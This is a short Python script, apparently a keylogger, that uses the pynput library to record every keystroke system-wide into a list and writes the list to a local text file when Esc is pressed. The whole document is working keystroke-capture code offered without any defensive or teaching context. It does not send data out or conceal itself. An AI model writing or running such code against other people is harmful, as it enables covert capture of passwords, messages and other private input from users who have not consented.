from pynput import keyboard

captured_keys = []

def on_key_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    captured_keys.append(key_str + ',')

    if key == keyboard.Key.esc:
        save_captured_keys()
        return False

def save_captured_keys():
    with open('captured_keys.txt', 'w') as file:
        file.write(''.join(captured_keys))

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()

save_captured_keys()
